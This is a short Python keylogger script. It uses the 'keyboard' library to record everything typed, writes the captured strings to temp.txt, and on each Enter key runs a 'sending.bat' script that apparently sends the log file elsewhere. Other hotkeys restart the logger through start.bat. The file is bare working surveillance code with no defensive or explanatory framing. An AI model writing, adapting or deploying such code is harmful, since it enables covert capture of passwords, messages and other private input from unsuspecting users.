import keyboard
import os 
 
def restart():
    print ('stop')
    os.system('start.bat')
    exit()

def sending():
    print ('send file...')
    os.system('sending.bat')

keyboard.add_hotkey('Shift + Alt', restart)
keyboard.add_hotkey('Windows + Space', restart)
keyboard.add_hotkey('Enter', sending)

while (True):
    events = keyboard.record('space')
    print(list(keyboard.get_typed_strings(events)))
    f = open('temp.txt', 'a')
    f.write('\n'.join(list(keyboard.get_typed_strings(events))))
    f.close() 
